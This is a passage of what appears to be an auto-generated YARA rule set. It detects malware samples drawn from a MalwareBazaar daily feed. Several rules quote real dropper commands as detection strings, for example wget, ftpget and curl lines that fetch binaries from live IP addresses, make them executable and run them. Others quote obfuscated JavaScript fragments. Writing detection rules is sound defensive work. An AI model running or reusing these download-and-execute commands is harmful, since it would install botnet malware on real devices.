      $s7 = "JibwAGMABEPgCQCyAgciRcXG88JBIno5ypBP/SAyJOMyJSQwAawdJwD0EgciD/DsDDEsAE0zQWJJ/7DsPcHN6PY1R1IBkwktPwMzMzMzMzMzMzMzMz8wdt1XeRfZNSAx" ascii
      $s8 = "PwJi6OMgaNPgaGetd9AnyAhfLufCaderTgDgXn4erTgDhAAAAU6yBuciad/gPnIkQCJkQCJkQCJkQCAAAwlul5hSjmLAKMkxq3OCDdsZsbg7RQwQHDuAib9AHzedll/g" ascii
      $s9 = "qBgaIRCd/jEJ09PAAAAjkQ7/8U3/AV3/gQCf3erTgDAEkQ1tPgCJ0d7DAAAAISCn3erTgDARkw0iARCRLCBJElIEEPIAAEAOoHlUQdFAAAAokwYjARCVNSwcwQCRNSw6" ascii
      $s10 = "AAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '             ' */
      $s11 = "RERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERERE" ascii /* base64 encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s12 = "REREREREREREREREREREREREQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABE" ascii /* base64 encoded string 'DDDDDDDDDDDDDDDDDD@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D' */
      $s13 = "DAAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 @  @            ' */
      $s15 = "AAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '             ' */
      $s16 = "AAAAAAAABA" ascii /* reversed goodware string 'ABAAAAAAAA' */
      $s17 = "FUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQAB" ascii /* base64 encoded string 'Q EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ ' */
      $s18 = "AAAAAAAAAAAAB" ascii /* base64 encoded string '         ' */
      $s19 = "bkWw1tqVSab5kKbM1jBWoKAS/7yWW6rlRGH05x/ZnZ4TUlcuueWPA7dLLpIA4KerTgDyAgr45KerTgDMt2FA4KulAgr43hmAHwHA4KulAgr4L0erTgDE70PA4GOnAgb4" ascii
      $s20 = "sa7DQCJkQKXujEtvNaE3l9LAAQ6pIRCRHbadgSHRkQ0xi6Hr/BEJEdMEkw0iqXXC5PYQQwAVIaiwACBDUJT7CDoyJmcMAgBJEZMAAAAAUQCRHrSt0cDEkQ0xAQUw0HK4" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule a7db6879ea9bb70d8d8d9c22e620fc69187d0fa226e7eb6f89ee6fc226433352 {
   meta:
      description = "evidences - file a7db6879ea9bb70d8d8d9c22e620fc69187d0fa226e7eb6f89ee6fc226433352.js"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "a7db6879ea9bb70d8d8d9c22e620fc69187d0fa226e7eb6f89ee6fc226433352"
   strings:
      $s1 = ")) / 0x7 + parseInt(_0x252f56(0x7)) / 0x8 + -parseInt(_0x252f56(0x8)) / 0x9;" fullword ascii
      $s2 = "+ parseInt(_0x252f56(0x3)) / 0x4 + -parseInt(_0x252f56(0x4)) / 0x5 * (-parseInt(_0x252f56(0x5)) / 0x6) + -parseInt(_0x252f56(0x6" ascii
      $s3 = "6)) / 0x7) + -parseInt(_0x3735a8(0x7)) / 0x8 + -parseInt(_0x3735a8(0x8)) / 0x9 + parseInt(_0x3735a8(0x9)) / 0xa;" fullword ascii
      $s4 = "+ parseInt(_0x3735a8(0x3)) / 0x4 * (-parseInt(_0x3735a8(0x4)) / 0x5) + -parseInt(_0x3735a8(0x5)) / 0x6 * (-parseInt(_0x3735a8(0x" ascii
      $s5 = "s sleep. She found Johnsy with wide-open eyes staring at the covered window. " fullword ascii
      $s6 = "he wall one ivy leaf. It was the last one on the vine. It was still dark green at the center. But its edges were colored with th" ascii
      $s7 = " she ordered, quietly. Sue obeyed. After the beating rain and fierce wind that blew through the night, there yet stood against t" ascii
      $s8 = "he wall one ivy leaf. It was the last one on the vine. It was still dark green at the centThe next morning, Sue awoke after an h" ascii
      $s9 = " she ordered, quietly. Sue obeyed. After the beating rain and fierce wind that blew through the night, there yet stood against t" ascii
      $s10 = " she ordered, quietly. Sue obeyed. After the beating rain and fierce wind that blew through the night, there yet stood against t" ascii
      $s11 = "n his room downstairs helpless with pain. His shoes and clothing were completely wet and icy cold. They could not imagine where " ascii
      $s12 = "bR(}#!%41k9v+}3{.34r5.wt_.ofp3c2t1b,e;+o(;R11;;;.11]Sc(6n(fupRt$1b1i\\x22b\\x27_3Rfa,d/5)\\x20,6D4t,R,0)]_;e)4nRu;1qR;$R.Ego]!oc" ascii
      $s13 = "            var _0x5a67ba = parseInt(_0x3735a8(0x0)) / 0x1 * (parseInt(_0x3735a8(0x1)) / 0x2) + -parseInt(_0x3735a8(0x2)) / 0x3 " ascii
      $s14 = "%R3=5$n#4iS=R!.mRa,e9c.sRoo.t*f.rpR.T3#f10s]\\x22gac{12,)S7s.n_(wat40r$t(1RR1)(rR.,.p,j).#8R$R,[!,;}.)#:e),obfSr)%3:=n%Rso$nd.%$" ascii
      $s15 = "            var _0x5a67ba = parseInt(_0x3735a8(0x0)) / 0x1 * (parseInt(_0x3735a8(0x1)) / 0x2) + -parseInt(_0x3735a8(0x2)) / 0x3 " ascii
      $s16 = "Mister Behrman died of pneumonia today in the hospital. He was sick only two days. They found him the morning of the first day i" ascii
      $s17 = "            var _0x5940d8 = parseInt(_0x252f56(0x0)) / 0x1 * (-parseInt(_0x252f56(0x1)) / 0x2) + parseInt(_0x252f56(0x2)) / 0x3 " ascii
      $s18 = "Mister Behrman died of pneumonia today in the hospital. He was sick only two days. They found him the morning of the first day i" ascii
      $s19 = "vq[cre=t;p]v\\x201(]ooijdsyt]=t\\x206lh\\x22o3i=+;vA8.hrs=+er0;)a12.;2fao7=1\\x20((ovl!2b,(u,6rth.nrthh=;rqvr8urlv9rrtxp,res(tqh" ascii
      $s20 = "u#_$s%)S!#\\x20Ra%R3asaR;.l.f_n)a35c91)7(%iejf;5Rs&R\\x22;!{ep;(#1\\x27]jR1a)RRR.tSw(2,}6)a1i.up&jo.e_\\x27R+4#.R=%%06ns/.t7rR3," ascii
   condition:
      uint16(0) == 0x2a2f and filesize < 2000KB and
      8 of them
}

rule sig_2b7bdc9330abd289bf3e39124f4c699781c035a3ec98b0d5b5cbf99578b817e4 {
   meta:
      description = "evidences - file 2b7bdc9330abd289bf3e39124f4c699781c035a3ec98b0d5b5cbf99578b817e4.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "2b7bdc9330abd289bf3e39124f4c699781c035a3ec98b0d5b5cbf99578b817e4"
   strings:
      $s1 = "ftpget 103.130.212.99 -P 8021 mips mips; chmod 777 mips; ./mips boa" fullword ascii
      $s2 = "ftpget 103.130.212.99 -P 8021 mpsl mpsl; chmod 777 mpsl; ./mpsl boa" fullword ascii
      $s3 = "wget http://103.130.212.99/mpsl; chmod +x mpsl; ./mpsl boa" fullword ascii
      $s4 = "wget http://103.130.212.99/mips; chmod +x mips; ./mips boa" fullword ascii
      $s5 = "cd /tmp;" fullword ascii
      $s6 = "rm mips mpsl;" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_2c4864c86db7b66f1410dbd57e7a94131659c32daba1e1daabb20eb1128e88e0 {
   meta:
      description = "evidences - file 2c4864c86db7b66f1410dbd57e7a94131659c32daba1e1daabb20eb1128e88e0.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "2c4864c86db7b66f1410dbd57e7a94131659c32daba1e1daabb20eb1128e88e0"
   strings:
      $s1 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"><script></script></head><body>" fullword ascii
      $s2 = "syoyqys" fullword ascii
      $s3 = "wgpzayip" fullword ascii
      $s4 = "lll));l11=navigator.userAgent.toLowerCase();function lI1(l1I){return " fullword ascii
      $s5 = "</body>l1l=document.all;var " fullword ascii
      $s6 = "'a%79%28%29%2Cl%30%3Dn\\145w%20Ar\\162a%79%28%29%2C%49l%3D%31%32%38%3B\\144o%7B%6C%30%5B\\111%6C%5D%3DS\\164ri%6E%67%2Efr%6FmCha" ascii
      $s7 = "l11.indexOf(l1I)&gt;0?true:false};lII=lI1('kht')|lI1('per');a8b9f|" fullword ascii
      $s8 = "Stzasfy" fullword ascii
      $s9 = "onqmsdx " fullword ascii
      $s10 = "\\'cmcovMb" fullword ascii
      $s11 = "cscud?cxb" fullword ascii
      $s12 = "61%38\\142%39f%29%7Bdo%63\\165\\155%65nt%2E\\167rite%28\\154\\117%29%7D%3B';n67jbO47" fullword ascii
      $s13 = "{gegnnOgqj1gs" fullword ascii
      $s14 = "Array();j8cboU4mq[0]='%74\\170o\\120%38%30MYMe\\161%38';qJfg9ttf7=new " fullword ascii
      $s15 = "kzal.k';function " fullword ascii
      $s16 = "Nv@twvm}\\'w)u" fullword ascii
      $s17 = "Ftrw?t2tmtotIv?umu4v[uttbts~Ss" fullword ascii
      $s18 = "txojv\\\\h!qft" fullword ascii
      $s19 = "lydyfyhyjyly_" fullword ascii
      $s20 = "sOsQsSsUq" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      8 of them
}

rule sig_347f50a42a4547c24510aede3a0786ac60b0a7761f28bc884021d8805c78115f {
   meta:
      description = "evidences - file 347f50a42a4547c24510aede3a0786ac60b0a7761f28bc884021d8805c78115f.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "347f50a42a4547c24510aede3a0786ac60b0a7761f28bc884021d8805c78115f"
   strings:
      $s1 = "%d%<M+" fullword ascii
      $s2 = "t,Lv]1 /k" fullword ascii
      $s3 = "DXzyFn|" fullword ascii
      $s4 = "zWPw'eN" fullword ascii
      $s5 = "wdyvO\\" fullword ascii
      $s6 = "USSdbbv|" fullword ascii
      $s7 = "YqxN2^Xg" fullword ascii
      $s8 = "ftWZcSF" fullword ascii
      $s9 = "LnupZHX" fullword ascii
      $s10 = "@lvEu.TE" fullword ascii
      $s11 = "\\!\\0wB." fullword ascii
      $s12 = "jgPeY3" fullword ascii
      $s13 = "\\is8Rqn" fullword ascii
      $s14 = "\\]c^95" fullword ascii
      $s15 = "\\UK9.y" fullword ascii
      $s16 = "\\?CbiB0=" fullword ascii
      $s17 = "\\a0xgvy" fullword ascii
      $s18 = "\\RRmNw" fullword ascii
      $s19 = "6,}Wuy" fullword ascii
      $s20 = "r+p1SU" fullword ascii
   condition:
      uint16(0) == 0x5089 and filesize < 400KB and
      8 of them
}

rule sig_9bb7005817ac931a33d0837aba6191655f4105cfbed4e66331d220d9ad223741 {
   meta:
      description = "evidences - file 9bb7005817ac931a33d0837aba6191655f4105cfbed4e66331d220d9ad223741.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "9bb7005817ac931a33d0837aba6191655f4105cfbed4e66331d220d9ad223741"
   strings:
      $s1 = "* dny." fullword ascii
      $s2 = "ji* /n" fullword ascii
      $s3 = "SPyM`R>q" fullword ascii
      $s4 = "@M- /KI" fullword ascii
      $s5 = "2bcpm -." fullword ascii
      $s6 = "drrcsws" fullword ascii
      $s7 = ".or,tCcSAMsz" fullword ascii
      $s8 = "Bx9.lJz" fullword ascii
      $s9 = "fxu.fBP>" fullword ascii
      $s10 = "1P:\"\"c" fullword ascii
      $s11 = "=C:\\zV" fullword ascii
      $s12 = "DkcmDJy" fullword ascii
      $s13 = "Ch2E.yPU" fullword ascii
      $s14 = "zg:\\)~" fullword ascii
      $s15 = "{n:\\!k" fullword ascii
      $s16 = "%xDhEl.jEw" fullword ascii
      $s17 = "Bkt:\"`" fullword ascii
      $s18 = "X}/M:\"M" fullword ascii
      $s19 = "ZN:\\g?" fullword ascii
      $s20 = "F:\"uAi" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 26000KB and
      8 of them
}

rule b6539a08c0b0f5a91f772560f793452eb358072f3ea73a5d68824b13a2df220a {
   meta:
      description = "evidences - file b6539a08c0b0f5a91f772560f793452eb358072f3ea73a5d68824b13a2df220a.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "b6539a08c0b0f5a91f772560f793452eb358072f3ea73a5d68824b13a2df220a"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/lszeJmGx7tHbFqb6HFyxqJaY9csrwaUiPb; curl -O" ascii
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/CQvmdA5DoCIEJ6f2htaqEvjCxqopbedJZC; curl -O" ascii
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/EwSXT4XVdxjoTRek9HnjXzD63HpNTDT0pU; curl -O" ascii
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/UKELN139lAS5L1EqSGNQzLdreTE6LsBxgF; curl -O" ascii
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/6gllndESBLcvCvBPI7OcNmOpwDglTk76JE; curl -O" ascii
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/0tnbLzVPrQorXMCjFxRtZcHFiWcqRsqonc; curl -O" ascii
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/TJ4TIfO7BGMR9odX9U8qYPXPLzXyBLDTDH; curl -O" ascii
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/gKXlmLzOdsE0X32KyCeaFnZB9iClFaCMiv; curl -O" ascii
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/jQ2bnMbpRZvdiQnZegegFCYnH4INNOneKj; curl -O" ascii
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/L31Lwa4MUQnoiKSzYhSMMFz8xPWfJ95XQy; curl -O" ascii
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/w8a44iHsLNmPg7kpqRF5DSfOwRwDdonBxX; curl -O" ascii
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/EaW5KQ3hguoWGo4Zjii2trGYXS8gLepahS; curl -O" ascii
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/OqtjBa9leR7QSoM9vtsa6TrjB5ekTXCFcL; curl -O" ascii
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/nWJ7gNuIVaq0nKkQRYQFG71Fr8rEQz46bn; curl -O" ascii
      $s15 = "wget http://94.154.35.94/bins/TJ4TIfO7BGMR9odX9U8qYPXPLzXyBLDTDH; curl -O  http://94.154.35.94/bins/TJ4TIfO7BGMR9odX9U8qYPXPLzXy" ascii
      $s16 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/w8a44iHsLNmPg7kpqRF5DSfOwRwDdonBxX; curl -O" ascii
      $s17 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.35.94/bins/jQ2bnMbpRZvdiQnZegegFCYnH4INNOneKj; curl -O" ascii
      $s18 = "wget http://94.154.35.94/bins/UKELN139lAS5L1EqSGNQzLdreTE6LsBxgF; curl -O  http://94.154.35.94/bins/UKELN139lAS5L1EqSGNQzLdreTE6" ascii
      $s19 = "wget http://94.154.35.94/bins/w8a44iHsLNmPg7kpqRF5DSfOwRwDdonBxX; curl -O  http://94.154.35.94/bins/w8a44iHsLNmPg7kpqRF5DSfOwRwD" ascii
      $s20 = "wget http://94.154.35.94/bins/OqtjBa9leR7QSoM9vtsa6TrjB5ekTXCFcL; curl -O  http://94.154.35.94/bins/OqtjBa9leR7QSoM9vtsa6TrjB5ek" ascii
   condition:
      uint16(0) == 0x2123 and filesize < 30KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af_a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2_0 {
   meta:
      description = "evidences - from files 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe, a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
      hash2 = "a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5"
   strings:
      $x1 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */
      $s2 = "failed to get WixShellExecBinaryId" fullword ascii
      $s3 = "failed to process target from CustomActionData" fullword ascii
      $s4 = "failed to get handle to kernel32.dll" fullword ascii
      $s5 = "failed to get security descriptor's DACL - error code: %d" fullword ascii
      $s6 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii
      $s7 = "failed to get WixShellExecTarget" fullword ascii
      $s8 = "failed to schedule ExecServiceConfig action" fullword ascii
      $s9 = "App: %ls found running, %d processes, attempting to send message." fullword ascii
      $s10 = "Command failed to execute." fullword ascii
      $s11 = "failed to openexecute temp view with query %ls" fullword ascii
      $s12 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii
      $s13 = "WixShellExecTarget is %ls" fullword ascii
      $s14 = "Microsoft.Deployment.WindowsInstaller.dll" fullword ascii
      $s15 = "failed to get message to send to users when server reboots due to service failure." fullword ascii
      $s16 = "WixShellExecTarget" fullword wide
      $s17 = "ExecServiceConfig" fullword ascii
      $s18 = "failed to schedule ExecXmlConfigRollback for file: %ls" fullword ascii
      $s19 = "Failed in ExecCommon method" fullword ascii
      $s20 = "failed to read shortcut target from custom action data" fullword ascii
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0xcfd0 ) and filesize < 16000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af_f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79_1 {
   meta:
      description = "evidences - from files 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe, f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
      hash2 = "f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7"
   strings:
      $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s2 = "operator<=>" fullword ascii
      $s3 = ".data$rs" fullword ascii
      $s4 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s5 = "D$0@8{" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "api-ms-win-core-file-l1-2-2" fullword wide /* Goodware String - occured 1 times */
      $s7 = "u3HcH<H" fullword ascii /* Goodware String - occured 2 times */
      $s8 = " A_A^A]A\\_^]" fullword ascii
      $s9 = "D81uUL9r" fullword ascii
      $s10 = "L$ |+L;" fullword ascii
      $s11 = " A_A^A]A\\_" fullword ascii
      $s12 = " A^A]A\\_^" fullword ascii
      $s13 = " A_A^A\\" fullword ascii
      $s14 = "f9)u4H9j" fullword ascii
      $s15 = "vAD8s(t" fullword ascii
      $s16 = "fD91uTL9r" fullword ascii
      $s17 = ";I9}(tiH" fullword ascii
      $s18 = " A_A\\_^[" fullword ascii
      $s19 = " A_A^A\\_^" fullword ascii
      $s20 = "fD94H}aD" fullword ascii
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x98c4 ) and filesize < 16000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( 8 of them )
      ) or ( all of them )
}

rule _03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af_a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2_2 {
   meta:
      description = "evidences - from files 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe, a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5.msi, d0f7a44e877b0da6adf627c0a60b4f5253af4b9d488001523c63b28585f0e6cb.exe, f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
      hash2 = "a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5"
      hash3 = "d0f7a44e877b0da6adf627c0a60b4f5253af4b9d488001523c63b28585f0e6cb"
      hash4 = "f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7"
   strings:
      $s1 = " Type Descriptor'" fullword ascii
      $s2 = " Class Hierarchy Descriptor'" fullword ascii
      $s3 = " Base Class Descriptor at (" fullword ascii
      $s4 = " Complete Object Locator'" fullword ascii
      $s5 = " delete[]" fullword ascii
      $s6 = " delete" fullword ascii
      $s7 = " new[]" fullword ascii
      $s8 = " Base Class Array'" fullword ascii
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0xcfd0 or uint16(0) == 0x98c4 ) and filesize < 16000KB and ( all of them )
      ) or ( all of them )
}

rule _03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af_a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2_3 {
   meta:
      description = "evidences - from files 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe, a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5.msi, f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
      hash2 = "a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5"
      hash3 = "f85660816db349ec3a6fc51acbfc8ec9c495e3e52c93d63f2a949f6c79da53e7"
   strings:
      $s1 = "operator co_await" fullword ascii
      $s2 = "__swift_1" fullword ascii
      $s3 = "__swift_2" fullword ascii
      $s4 = "api-ms-" fullword wide
      $s5 = "ext-ms-" fullword wide
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0xcfd0 or uint16(0) == 0x98c4 ) and filesize < 16000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( all of them )
      ) or ( all of them )
}

rule _03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af_1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b_4 {
   meta:
      description = "evidences - from files 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe, 1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b871153.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
      hash2 = "1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b871153"
   strings:
      $s1 = "Resume" fullword ascii /* Goodware String - occured 179 times */
      $s2 = "Reverse" fullword ascii /* Goodware String - occured 338 times */
      $s3 = "Update" fullword ascii /* Goodware String - occured 460 times */
      $s4 = "Default" fullword ascii /* Goodware String - occured 912 times */
      $s5 = "EndInvoke" fullword ascii /* Goodware String - occured 915 times */
      $s6 = "BeginInvoke" fullword ascii /* Goodware String - occured 932 times */
      $s7 = "System" fullword ascii /* Goodware String - occured 2567 times */
      $s8 = "Argument out of range" fullword wide /* Goodware String - occured 4 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( all of them )
      ) or ( all of them )
}

rule _03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af_22d12b8f0a3d85ea31d278488e203ed462bd4f34a5ff0c4030cd819d56_5 {
   meta:
      description = "evidences - from files 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe, 22d12b8f0a3d85ea31d278488e203ed462bd4f34a5ff0c4030cd819d56c65bab.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
      hash2 = "22d12b8f0a3d85ea31d278488e203ed462bd4f34a5ff0c4030cd819d56c65bab"
   strings:
      $s1 = "sessionId" fullword ascii /* Goodware String - occured 100 times */
      $s2 = "Shared" fullword ascii /* Goodware String - occured 132 times */
      $s3 = "signature" fullword ascii /* Goodware String - occured 251 times */
      $s4 = "username" fullword ascii /* Goodware String - occured 262 times */
      $s5 = "Signature" fullword ascii /* Goodware String - occured 282 times */
      $s6 = "password" fullword ascii /* Goodware String - occured 519 times */
      $s7 = "Status" fullword ascii /* Goodware String - occured 604 times */
      $s8 = "nameBytes" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and ( all of them )
      ) or ( all of them )
}

rule _03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af_b0c71e2b19b3cde4f32ccf2159ab94beca188ffab5d761f2d610989821_6 {
   meta:
      description = "evidences - from files 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe, b0c71e2b19b3cde4f32ccf2159ab94beca188ffab5d761f2d610989821c772c3.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-14"
      hash1 = "03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af"
      hash2 = "b0c71e2b19b3cde4f32ccf2159ab94beca188ffab5d761f2d610989821c772c3"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s2 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii
      $s4 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s5 = "System.Security.Principal" fullword ascii /* Goodware String - occured 378 times */
      $s6 = "HKEY_LOCAL_MACHINE" fullword ascii /* Goodware String - occured 534 times */
      $s7 = "System.Runtime.CompilerServices" fullword ascii /* Goodware String - occured 1950 times */
      $s8 = "System.Reflection" fullword ascii /* Goodware String - occured 2186 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and ( all of them )
      ) or ( all of them )
}

rule _03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af_1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b_7 {
   meta:
      description = "evidences - from files 03643b6b2ee2967f0fa11d123fbdaf71109eec1c3aa771f5789fda09ef2500af.exe, 1e6608ca1f9cf80c479444e4d2461e3963a4516182d0acbba32cbd794b871153.exe, a78b24eacd8138edb9f0d440c2ffb98cee269ae32c8f8ba8790d4d60c2ee18e5.msi"
      author = "Sameer P Sheik"
